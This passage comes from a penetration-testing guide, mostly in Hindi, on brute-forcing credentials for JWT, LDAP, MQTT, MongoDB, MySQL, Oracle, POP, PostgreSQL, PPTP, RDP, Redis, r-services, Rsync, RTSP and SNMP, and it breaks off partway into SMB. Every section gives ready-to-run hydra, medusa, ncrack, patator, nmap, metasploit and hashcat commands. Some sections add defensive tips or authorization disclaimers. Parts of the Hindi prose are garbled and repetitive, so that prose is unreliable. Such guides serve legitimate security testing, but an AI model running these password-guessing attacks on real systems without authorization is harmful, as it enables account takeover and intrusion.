JWT टोकन को ब्रूट फोर्स अटैक के लिए उपयोग किया जा सकता है। इसमें हम विभिन्न कुंजी के संभावित मानों को परीक्षण करते हैं ताकि हम विश्वसनीय कुंजी को खोज सकें और टोकन को विफल कर सकें। इसके लिए हम एक ब्रूट फोर्स टूल का उपयोग कर सकते हैं जो विभिन्न कुंजी के संभावित मानों को आवश्यकतानुसार परीक्षण करता है। यह टेक्निक टोकन के विश्वसनीयता को तोड़ने का एक प्रभावी तरीका हो सकता है।
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
### LDAP

LDAP (Lightweight Directory Access Protocol) एक क्लाइंट-सर्वर प्रोटोकॉल है जिसका उपयोग नेटवर्क डायरेक्टरी सर्वर पर डेटा एक्सेस करने के लिए किया जाता है। यह एक खुला प्रोटोकॉल है और TCP/IP पर काम करता है। LDAP का उपयोग उपयोगकर्ता खातों, समूहों, संगठनात्मक यूनिट और अन्य नेटवर्क संबंधित जानकारी को संग्रहीत करने के लिए किया जाता है।

LDAP ब्रूट फोर्स एक तकनीक है जिसमें हम एक उपयोगकर्ता के लिए संभावित पासवर्ड की सूची का उपयोग करके उपयोगकर्ता के खाते में प्रवेश करने की कोशिश करते हैं। यह एक प्रभावी तकनीक है जो बहुत कम समय में बहुत सारे पासवर्ड की संभावितताओं को जांचने की क्षमता देती है। LDAP ब्रूट फोर्स टूल्स और स्क्रिप्ट्स का उपयोग करके हम इस तकनीक का उपयोग कर सकते हैं।

LDAP ब्रूट फोर्स करने के लिए, हमें एक उपयोगकर्ता नाम और पासवर्ड की सूची की आवश्यकता होती है। हम इस सूची को एक ब्रूट फोर्स टूल या स्क्रिप्ट के साथ उपयोग करके उपयोगकर्ता के खाते में प्रवेश करने की कोशिश करते हैं। यदि हमें सफलता मिलती है, तो हम उपयोगकर्ता के खाते में प्रवेश कर सकते हैं और उसके अधिकारों का उपयोग कर सकते हैं।

LDAP ब्रूट फोर्स करते समय, हमें ध्यान देने की आवश्यकता होती है कि हम निरंतर विफलता के बावजूद ब्रूट फोर्स को जारी रखें, क्योंकि यह खाता लॉकआउट की स्थिति में आ सकता है। इसलिए, हमें एक ब्रूट फोर्स टूल का उपयोग करते समय विफलता की सीमा को सेट करनी चाहिए और एक विफलता के बाद थोड़ी देर के लिए रुकना चाहिए। इससे हम खाता लॉकआउट से बच सकते हैं और ब्रूट फोर्स को जारी रख सकते हैं।
```bash
nmap --script ldap-brute -p 389 <IP>
```
### MQTT

MQTT (Message Queuing Telemetry Transport) एक lightweight publish-subscribe-based messaging protocol है जो IoT (Internet of Things) और M2M (Machine to Machine) communication के लिए डिज़ाइन किया गया है। यह TCP/IP protocol का उपयोग करता है और नेटवर्क के ऊपर तेजी से और आसानी से संदेशों को भेजने और प्राप्त करने की क्षमता प्रदान करता है। MQTT का उपयोग करके, डिवाइस और एप्लिकेशन एक दूसरे के साथ डेटा को संचारित कर सकते हैं और इसे अपने आवश्यकताओं के अनुसार कस्टमाइज़ कर सकते हैं।

MQTT का उपयोग करके ब्रूट फ़ोर्स हमलों को अपनाया जा सकता है। इसमें हमलावर एक बहुत बड़ी संख्या में पासवर्ड की कोशिशें करता है ताकि वह सही पासवर्ड को खोज सके। यह एक प्रभावी तकनीक है जो अनुमानित पासवर्ड की खोज करने में मदद करती है। ब्रूट फ़ोर्स हमलों के लिए कई टूल्स और स्क्रिप्ट्स उपलब्ध हैं जो MQTT ब्रोकर के साथ इस्तेमाल किए जा सकते हैं।

ब्रूट फ़ोर्स हमलों के द्वारा MQTT के लिए पासवर्ड की खोज करने के लिए, हमलावर को एक पासवर्ड की सूची प्रदान की जाती है और वह सभी पासवर्ड की कोशिशें करता है ताकि सही पासवर्ड को खोज सके। यदि सही पासवर्ड मिल जाता है, तो हमलावर MQTT ब्रोकर में सफलतापूर्वक प्रवेश कर सकता है। इसलिए, MQTT के सुरक्षा को सुनिश्चित करने के लिए, सुरक्षित पासवर्ड का उपयोग करना और ब्रूट फ़ोर्स हमलों के खिलाफ सुरक्षा उपाय अपनाना आवश्यक होता है।
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
```
### मोंगो

MongoDB एक खुला स्रोत डेटाबेस प्रणाली है जो डेटा को दस्तावेज़ के रूप में संग्रहीत करती है। यह एक NoSQL डेटाबेस है जिसमें डेटा को JSON जैसे दस्तावेज़ों में संग्रहीत किया जाता है। MongoDB का उपयोग विभिन्न वेब एप्लिकेशन और साइबर सुरक्षा में किया जाता है।

#### ब्रूट फोर्स अटैक

ब्रूट फोर्स अटैक एक हैकिंग तकनीक है जिसमें हम एक विशेषता को टेस्ट करने के लिए संभावित पासवर्ड की सूची का उपयोग करते हैं। इस तकनीक का उपयोग करके हम अनुमान लगा सकते हैं कि विशेषता के लिए सही पासवर्ड क्या हो सकता है। यदि हमें सही पासवर्ड मिल जाता है, तो हम उसे उपयोग करके विशेषता में प्रवेश कर सकते हैं।

ब्रूट फोर्स अटैक के लिए हम विभिन्न टूल्स और स्क्रिप्ट्स का उपयोग कर सकते हैं जो स्वचालित रूप से पासवर्ड की संभावित सूची को चेक करते हैं। यह तकनीक अक्सर वेब एप्लिकेशन, डेटाबेस और नेटवर्क उपकरणों को हैक करने के लिए उपयोग की जाती है।

ब्रूट फोर्स अटैक को रोकने के लिए, विशेषता के लिए शक्तिशाली पासवर्ड का उपयोग करें और अधिकतम पासवर्ड प्रयासों की सीमा निर्धारित करें। इसके अलावा, दुर्गम पासवर्ड की संभावित सूची को रोकने के लिए ब्रूट फोर्स अटैक की गति को धीमा करें।
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
```
### MySQL

MySQL एक खुला स्रोत डेटाबेस प्रणाली है जिसे आमतौर पर वेब ऐप्लिकेशन और वेबसाइटों के लिए उपयोग किया जाता है। यह एक रिलेशनल डेटाबेस प्रणाली है जिसमें डेटा तालिकाओं में संगठित होता है। MySQL डेटाबेस को ब्रूट फोर्स अटैक के खिलाफ सुरक्षित रखना महत्वपूर्ण है। ब्रूट फोर्स अटैक एक तकनीक है जिसमें हमेशा बदलते रहने वाले पासवर्ड की कोशिश की जाती है ताकि एक विशेष खाते में प्रवेश किया जा सके। इसके लिए, हैकर एक शब्दकोश का उपयोग करता है और उसे एक एक्सेस पॉइंट पर लागू करता है ताकि वह सही पासवर्ड को खोज सके। MySQL ब्रूट फोर्स अटैक को रोकने के लिए, आपको कुछ सुरक्षा उपाय अपनाने चाहिए, जैसे कि शक्तिशाली पासवर्ड नीतियाँ, लॉगिन प्रयासों की सीमा, और अद्यतनित सॉफ़्टवेयर का उपयोग करना।
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql
```
# OracleSQL

OracleSQL एक शक्तिशाली डेटाबेस प्रणाली है जिसका उपयोग डेटाबेस में डेटा संग्रहीत करने, प्रबंधित करने और प्रश्न पूछने के लिए किया जाता है। यह एक संरचित भाषा है जिसका उपयोग डेटाबेस ऑब्जेक्ट्स को बनाने, संशोधित करने और प्रबंधित करने के लिए किया जाता है। OracleSQL का उपयोग डेटाबेस के साथ कई कार्यों को करने के लिए किया जा सकता है, जैसे कि डेटा एंट्री, डेटा निकालना, डेटा अद्यतन और डेटा हटाना।

OracleSQL में ब्रूट फोर्स एक तकनीक है जिसका उपयोग डेटाबेस के लॉगिन प्रमाणों को खोजने के लिए किया जाता है। इस तकनीक में, हम एक शब्दकोश का उपयोग करके संभावित पासवर्ड की संभावनाओं को जांचते हैं और उन्हें एक एक्सेस नियंत्रण प्रणाली पर आजमाते हैं। यदि सही पासवर्ड मिल जाता है, तो हम डेटाबेस में सफलतापूर्वक लॉगिन कर सकते हैं।

ब्रूट फोर्स अटैक को अवरोधित करने के लिए, OracleSQL में कई सुरक्षा उपाय हैं, जैसे कि लॉगिन प्रमाणों की संख्या की सीमा, लॉगिन प्रमाणों की लॉकआउट समय सीमा, और लॉगिन प्रमाणों की त्रुटि की संख्या की सीमा। इन सुरक्षा उपायों का उपयोग करके, डेटाबेस प्रशासक ब्रूट फोर्स अटैक के खिलाफ सुरक्षा को मजबूत कर सकता है।

ब्रूट फोर्स अटैक को अवरोधित करने के लिए, कुछ उपयोगी उपाय हैं जैसे कि लॉगिन प्रमाणों की लंबाई को सीमित करना, लॉगिन प्रमाणों की लॉकआउट समय सीमा निर्धारित करना, और लॉगिन प्रमाणों की त्रुटि की संख्या की सीमा निर्धारित करना। इन उपायों का उपयोग करके, डेटाबेस प्रशासक ब्रूट फोर्स अटैक के खिलाफ सुरक्षा को मजबूत कर सकता है।
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
```
**oracle_login** का उपयोग **patator** के साथ करने के लिए आपको **स्थापित** करने की आवश्यकता है:
```bash
pip3 install cx_Oracle --upgrade
```
[ऑफ़लाइन OracleSQL हैश ब्रूटफ़ोर्स](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**संस्करण 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** और **11.2.0.3**):
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
### POP

POP (Post Office Protocol) एक ईमेल प्रोटोकॉल है जिसका उपयोग ईमेल क्लाइंट और मेल सर्वर के बीच संचार के लिए किया जाता है। POP का उपयोग करके, उपयोगकर्ता अपने मेल सर्वर से अपने ईमेल खाते में संदेश डाउनलोड कर सकते हैं। POP के लिए एक उपयोगकर्ता नाम और पासवर्ड की आवश्यकता होती है ताकि उपयोगकर्ता को अपने खाते में पहुंच मिल सके।

POP के ब्रूट फोर्स अटैक के द्वारा, हैकर एक बड़ी संख्या में पासवर्ड की कोशिशें करता है ताकि वह सही पासवर्ड को खोज सके। यह एक साधारण और प्रभावी हैकिंग तकनीक है, लेकिन यह समय लगा सकती है क्योंकि हैकर को अनेक पासवर्ड की कोशिशें करनी होती हैं।

ब्रूट फोर्स अटैक को अवरोधित करने के लिए, उपयोगकर्ता को मजबूत पासवर्ड का उपयोग करना चाहिए जो लंबाई, विशेष अक्षर, अंक और विशेष चिह्नों का उपयोग करता है। इसके अलावा, उपयोगकर्ता को अपने पासवर्ड को नियमित रूप से बदलना चाहिए और एक दो-पाया प्रमाणीकरण प्रक्रिया का उपयोग करना चाहिए जैसे कि द्विचरणीय प्रमाणीकरण (2FA)।
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
```
### PostgreSQL

PostgreSQL एक ओपन सोर्स रिलेशनल डेटाबेस प्रणाली है जिसे बहुत सारे प्रोजेक्ट्स द्वारा उपयोग किया जाता है। यह एक शक्तिशाली और सुरक्षित डेटाबेस है जिसमें विभिन्न फ़ीचर्स और एक्सटेंशन्स शामिल हैं। PostgreSQL डेटाबेस को ब्रूट फ़ोर्स अटैक के खिलाफ सुरक्षित रखने के लिए कुछ उपाय उपलब्ध हैं। यहां कुछ ऐसे तकनीक दिए गए हैं जिनका उपयोग करके आप PostgreSQL डेटाबेस को ब्रूट फ़ोर्स अटैक से सुरक्षित रख सकते हैं।

#### 1. शक्तिशाली पासवर्ड नियंत्रण

PostgreSQL में शक्तिशाली पासवर्ड नियंत्रण सेट करना ब्रूट फ़ोर्स अटैक को रोकने का एक अच्छा तरीका है। आपको एक शक्तिशाली पासवर्ड नियंत्रण नीति तय करनी चाहिए जो उच्च सुरक्षा मानकों का पालन करती है। इसमें शामिल हो सकते हैं निम्नलिखित नियम:

- पासवर्ड की लंबाई कम से कम 8 अक्षर होनी चाहिए।
- अल्फ़ान्यूमेरिक और विशेष वर्णों का उपयोग करना चाहिए।
- पासवर्ड को नियमित अंतराल पर बदलना चाहिए।

#### 2. लॉकआउट नीति

PostgreSQL में लॉकआउट नीति सेट करना एक और उपाय है जिससे ब्रूट फ़ोर्स अटैक को रोका जा सकता है। इस नीति के अनुसार, यदि कोई उपयोगकर्ता निरंतर गलत पासवर्ड दर्ज करता है, तो उनका खाता लॉक हो जाएगा। आप लॉकआउट नीति को अपनी आवश्यकताओं के अनुसार विन्यासित कर सकते हैं, जैसे कि लॉकआउट समय और लॉकआउट के बाद खाता अनलॉक होने के लिए आवश्यक समय।

#### 3. एक्स्टेंशन्स का उपयोग

PostgreSQL में कई एक्सटेंशन्स उपलब्ध हैं जो ब्रूट फ़ोर्स अटैक के खिलाफ सुरक्षा प्रदान कर सकते हैं। आप इन एक्सटेंशन्स का उपयोग करके ब्रूट फ़ोर्स अटैक को रोक सकते हैं और अनुचित प्रवेश के प्रयासों को रोक सकते हैं। कुछ उपयोगी एक्सटेंशन्स शामिल हैं:

- pg_hba_file: यह एक्सटेंशन आपको एक फ़ाइल में निर्दिष्ट करने की अनुमति देता है कि कौन से उपयोगकर्ता और होस्ट डेटाबेस तक पहुंच सकते हैं।
- pg_bouncer: यह एक्सटेंशन एक कनेक्शन पूलर है जो अनुचित प्रवेश के प्रयासों को रोकता है और डेटाबेस के लिए सुरक्षित कनेक्शन प्रदान करता है।

इन तकनीकों का उपयोग करके आप PostgreSQL डेटाबेस को ब्रूट फ़ोर्स अटैक के खिलाफ सुरक्षित रख सकते हैं।
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
```
### PPTP

आप `.deb` पैकेज को इंस्टॉल करने के लिए [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/) से डाउनलोड कर सकते हैं।
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP

RDP (Remote Desktop Protocol) एक प्रोटोकॉल है जिसका उपयोग दूरस्थ डेस्कटॉप कनेक्शन स्थापित करने के लिए किया जाता है। यह विंडोज ऑपरेटिंग सिस्टम पर उपयोग होता है और उपयोगकर्ता को एक सिस्टम पर दूरस्थ रूप से एक्सेस करने की अनुमति देता है। RDP के माध्यम से, हैकर एक निश्चित IP पते और पोर्ट का उपयोग करके दूरस्थ मशीन पर लॉगिन कर सकता है।

#### Brute Force Attacks on RDP

Brute force हमले RDP पर अत्यधिक प्रयासों का उपयोग करके उपयोगकर्ता के खाते के लिए संभावित पासवर्ड की खोज करने का प्रयास करते हैं। यह एक प्राथमिक और साधारण तरीका है जिसका उपयोग किया जाता है ताकि हैकर अनुमति प्राप्त कर सके और उपयोगकर्ता के खाते में पहुंच सके। यह तकनीक अक्सर अनुमति नियंत्रण के लिए डिफॉल्ट या कमजोर पासवर्ड का उपयोग करने वाले उपयोगकर्ताओं के खिलाफ उपयोग की जाती है।

#### ब्रूट फोर्स टूल्स

कुछ लोकप्रिय ब्रूट फोर्स टूल्स निम्नलिखित हैं:

- Hydra
- Medusa
- RDPY
- Crowbar

ये टूल्स अलग-अलग तरीकों का उपयोग करते हैं, जैसे कि विभिन्न पासवर्ड की सूची, शब्दकोश, यूजरनेम और पासवर्ड के संयोजन, और अन्य तकनीकों का उपयोग करके ब्रूट फोर्स हमले को संचालित करते हैं।

#### ब्रूट फोर्स के खिलाफ सुरक्षा

ब्रूट फोर्स हमलों से बचने के लिए कुछ सुरक्षा उपाय हैं:

- शक्तिशाली पासवर्ड का उपयोग करें जो लंबा, विशिष्ट और अन्यायपूर्ण चरित्रों का उपयोग करता हो।
- दूसरे उपयोगकर्ताओं के लिए डिफॉल्ट पासवर्ड का उपयोग न करें।
- लॉगिन प्रयासों की गिनती करें और अगर एक निश्चित संख्या तक गिनती हो जाती है, तो उपयोगकर्ता को अस्थायी रूप से ब्लॉक करें।
- दूरस्थ लॉगिन की सीमा निर्धारित करें और केवल आवश्यकतानुसार उपयोगकर्ताओं को दूरस्थ लॉगिन की अनुमति दें।
- दूरस्थ लॉगिन के लिए एक व्यक्तिगत VPN का उपयोग करें।

ये सुरक्षा उपाय ब्रूट फोर्स हमलों के खिलाफ सुरक्षा सुनिश्चित करने में मदद कर सकते हैं।
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
```
# Redis

Redis एक open-source, in-memory डेटा संरचना और कुंजी-मान डेटाबेस है। यह एक खोज इंजन, एक खोज इंजन, और एक खोज इंजन के रूप में भी उपयोग किया जा सकता है। Redis का उपयोग डेटा को कैश करने, सत्रों को प्रबंधित करने, मैसेज ब्रोकर के रूप में और अन्य कई उद्देश्यों के लिए किया जाता है।

Redis के ब्रूट फोर्स अटैक के लिए, हम एक शब्दकोश का उपयोग कर सकते हैं जिसमें विभिन्न पाठों की संख्या को आवश्यकतानुसार बदला जा सकता है। हम एक शब्दकोश का उपयोग करके एक ब्रूट फोर्स टूल को चला सकते हैं जो एक्सेस क्रेडेंशियल्स की कोशिका को आवश्यकतानुसार बदलता है और उन्हें Redis सर्वर पर प्रयास करता है। यदि सही क्रेडेंशियल्स मिल जाते हैं, तो हम उन्हें सफलतापूर्वक उपयोग कर सकते हैं।

ब्रूट फोर्स अटैक के लिए कुछ उपयोगी टूल्स शामिल हैं:

- **Hydra**: यह एक बहु-प्रोटोकॉल ब्रूट फोर्स टूल है जिसे आप Redis के साथ उपयोग कर सकते हैं।
- **Medusa**: यह एक अन्य ब्रूट फोर्स टूल है जिसे आप Redis पर उपयोग कर सकते हैं।
- **Ncrack**: यह एक नेटवर्क ब्रूट फोर्स टूल है जिसे आप Redis के साथ उपयोग कर सकते हैं।

यदि आप ब्रूट फोर्स अटैक का उपयोग करना चाहते हैं, तो ध्यान दें कि यह एक अवैध कार्य हो सकता है और आपको उचित अनुमति के साथ ही इसे करना चाहिए। आपको अपने खुद के सिस्टम पर या उचित अनुमति वाले सिस्टम पर ही ब्रूट फोर्स अटैक का उपयोग करना चाहिए।
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
```
### Rexec

Rexec (Remote Execution) is a network service that allows users to execute commands on a remote system. It is commonly used for administrative purposes, such as managing multiple systems from a central location.

Rexec operates on TCP port 512 and uses a simple plaintext protocol. To establish a connection, the client sends a username and password to the server. Once authenticated, the client can send commands to be executed on the remote system.

Brute-forcing Rexec involves systematically trying different combinations of usernames and passwords until the correct credentials are found. This can be done manually or using automated tools.

To perform a brute-force attack on Rexec, you can use tools like Hydra or Medusa. These tools allow you to specify a list of usernames and passwords to try, and they will automatically iterate through the list until successful authentication is achieved.

It is important to note that brute-forcing Rexec or any other service without proper authorization is illegal and unethical. This information is provided for educational purposes only. Always ensure you have proper permission before attempting any hacking techniques.
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

Rlogin (Remote Login) एक नेटवर्क प्रोटोकॉल है जिसका उपयोग दूरस्थ उपयोगकर्ता के लिए रिमोट लॉगिन करने के लिए किया जाता है। यह एक असुरक्षित प्रोटोकॉल है जो उपयोगकर्ता के नाम और पासवर्ड को सुरक्षित ढंग से नहीं भेजता है। इसलिए, इस प्रोटोकॉल का उपयोग करके लॉगिन करने के लिए ब्रूट फोर्स तकनीक का उपयोग किया जा सकता है।

ब्रूट फोर्स तकनीक का उपयोग करके, हम एक विशेषता की सूची को चेक करते हैं और उपयोगकर्ता के लिए संभावित पासवर्ड की एक सूची का उपयोग करते हैं। हम इस प्रक्रिया को एक लूप में चलाते हैं और संभावित पासवर्ड की हर एक संभावित मान्यता की जांच करते हैं। जब हमें सही पासवर्ड मिल जाता है, तो हम उसे उपयोग करके लॉगिन कर सकते हैं।

ब्रूट फोर्स तकनीक का उपयोग करने के लिए, हम विभिन्न टूल्स और स्क्रिप्ट का उपयोग कर सकते हैं जो एक ब्रूट फोर्स हमले को आसान बनाने में मदद करते हैं। इन टूल्स में Hydra, Medusa, Patator, Crowbar, आदि शामिल हैं। इन टूल्स का उपयोग करके हम ब्रूट फोर्स हमले की गति को बढ़ा सकते हैं और लॉगिन क्रेडेंशियल्स को तेजी से खोज सकते हैं।

ब्रूट फोर्स तकनीक का उपयोग करने से पहले, हमें ध्यान देने की आवश्यकता होती है कि हम केवल अपने अनुमानित पासवर्ड की एक सूची का उपयोग करें और अनुमानित पासवर्ड की लंबाई को सीमित रखें। इससे हम अनावश्यक लोगों के खातों में अनधिकृत प्रवेश से बच सकते हैं।
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

Rsh (Remote Shell) एक नेटवर्क प्रोटोकॉल है जो एक रिमोट मशीन पर शेल कमांड्स को चलाने की अनुमति देता है। यह एक असुरक्षित प्रोटोकॉल है जो अक्सर ब्रूट फोर्स हमलों के लिए उपयोग होता है। इसका उपयोग उपयोगकर्ता नाम और पासवर्ड की जांच करने के लिए किया जा सकता है।

ब्रूट फोर्स हमला करने के लिए, हम एक शब्दकोश का उपयोग करके संभावित पासवर्ड की सूची को चलाते हैं। हम एक नेटवर्क कनेक्शन की स्थापना करते हैं और फिर प्रत्येक पासवर्ड के लिए उपयोगकर्ता नाम और पासवर्ड को भेजते हैं। यदि सही पासवर्ड मिलता है, तो हम शेल कमांड्स को चला सकते हैं।

ब्रूट फोर्स हमलों को अवरोधित करने के लिए, आप निम्नलिखित उपायों का उपयोग कर सकते हैं:
- शक्तिशाली पासवर्ड का उपयोग करें।
- लॉकआउट नीतियों का उपयोग करें।
- लॉगिन गतिविधि की निगरानी करें और अनुशासन नियमों का पालन करें।
- ब्रूट फोर्स हमलों की गणना करें और उन्हें रोकें।

ब्रूट फोर्स हमलों के खिलाफ सुरक्षा को सुनिश्चित करने के लिए, आपको अपनी सिस्टमों को सुरक्षित रखने के लिए निम्नलिखित उपायों का उपयोग करना चाहिए:
- शक्तिशाली पासवर्ड का उपयोग करें और नियमित रूप से उन्हें बदलें।
- दो चरण प्रमाणीकरण (Two-Factor Authentication) का उपयोग करें।
- लॉगिन गतिविधि की निगरानी करें और आपत्तिजनक गतिविधियों की पहचान करें।
- नियमित रूप से अपडेट और पैच लागू करें।
- नेटवर्क ट्रैफिक की निगरानी करें और आपत्तिजनक गतिविधियों की पहचान करें।
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

RTSP (Real Time Streaming Protocol) है, जो एक नेटवर्क के माध्यम से वीडियो और ऑडियो संचार को संचालित करने के लिए उपयोग होता है। यह एक नेटवर्क प्रोटोकॉल है जो वीडियो संचार को स्थानांतरित करने के लिए उपयोग होता है। RTSP का उपयोग वीडियो संचार को स्थानांतरित करने के लिए किया जाता है, जहां एक सर्वर वीडियो संचार को संचालित करता है और क्लाइंट उसे प्राप्त करता है। RTSP का उपयोग वीडियो संचार के लिए विभिन्न प्रोटोकॉलों के साथ किया जा सकता है, जैसे कि RTP (Real-time Transport Protocol) और RTCP (Real-time Transport Control Protocol)।

RTSP का उपयोग वीडियो संचार के लिए ब्रूट फोर्स हमलों में भी किया जा सकता है। ब्रूट फोर्स हमलों में, हैकर एक सूची में संभावित पासवर्ड की कोशिश करता है ताकि वह सही पासवर्ड को खोज सके। RTSP सर्वरों पर ब्रूट फोर्स हमलों का उपयोग करके, हैकर वीडियो संचार को संचालित करने के लिए अनधिकृत उपयोगकर्ता नाम और पासवर्ड की कोशिश कर सकता है। यह एक प्रभावी हमला तकनीक है, लेकिन इसका उपयोग केवल वैध अनुमति के साथ किया जाना चाहिए।
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SNMP

SNMP (Simple Network Management Protocol) एक प्रोटोकॉल है जो नेटवर्क उपकरणों को निर्दिष्ट पैरामीटरों की निगरानी करने और प्रबंधित करने की सुविधा प्रदान करता है। यह उपकरणों के साथ कमांड और जवाब के माध्यम से संचार करता है और उपयोगकर्ताओं को नेटवर्क की स्थिति, उपकरण की उपलब्धता और समस्याओं की सूचना प्रदान करता है। SNMP का उपयोग नेटवर्क प्रबंधन और निगरानी के लिए किया जाता है और यह विभिन्न उपकरणों जैसे राउटर, स्विच, सर्वर, प्रिंटर आदि के साथ संचार कर सकता है।

SNMP के द्वारा, हैकर्स उपकरणों के साथ संचार करके उन्हें अनुप्रयोगों के लिए उपयोगी जानकारी प्राप्त कर सकते हैं। इसका उपयोग उपकरणों के लिए डिफॉल्ट क्रेडेंशियल्स, संदेशों, नेटवर्क की जानकारी, और अन्य उपयोगी डेटा की प्राप्ति के लिए किया जा सकता है।

SNMP ब्रूट फोर्स एक तकनीक है जिसमें हैकर्स एक ब्रूट फोर्स अटैक का उपयोग करके SNMP क्रेडेंशियल्स को खोजते हैं। इसके लिए, हैकर्स विभिन्न पासवर्ड की सूची का उपयोग करते हैं और उन्हें SNMP सर्वर पर एक्सेस करने के लिए प्रयास करते हैं। यदि सही क्रेडेंशियल्स मिल जाते हैं, तो हैकर्स उपकरण को प्रबंधित करने के लिए उनका उपयोग कर सकते हैं।

SNMP ब्रूट फोर्स अटैक को अवरोधित करने के लिए, उपयोगकर्ताओं को मजबूत क्रेडेंशियल्स का उपयोग करना चाहिए और SNMP सर्वर को असुरक्षित पासवर्डों से सुरक्षित करना चाहिए। इसके अलावा, नेटवर्क ट्रैफिक को मॉनिटर करने और अनोखे यूजरनेम और पासवर्ड की जगह उपयोग करने के लिए एक IDS/IPS सिस्टम का उपयोग किया जा सकता है।
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

SMB (Server Message Block) एक नेटवर्क प्रोटोकॉल है जो विंडोज ऑपरेटिंग सिस्टम में फ़ाइल और प्रिंटर साझा करने की सुविधा प्रदान करता है। SMB का उपयोग नेटवर्क के माध्यम से डेटा को सुरक्षित रूप से स्थानांतरित करने के लिए किया जाता है। यह एक क्लाइंट-सर्वर प्रोटोकॉल है, जिसमें क्लाइंट अनुरोध करता है और सर्वर उत्तर देता है।

SMB के ब्रूट फ़ोर्स अटैक के द्वारा हम एक विशेष उपयोगकर्ता खाता के लिए संभावित पासवर्ड की खोज कर सकते हैं। इसके लिए हम एक पासवर्ड की सूची तैयार करते हैं और उसे SMB सर्वर पर आवेदित करते हैं। यदि सर्वर उपयोगकर्ता के लिए उपयोगी पासवर्ड मिलता है, तो हम उसे उपयोग करके सर्वर में लॉगिन कर सकते हैं।

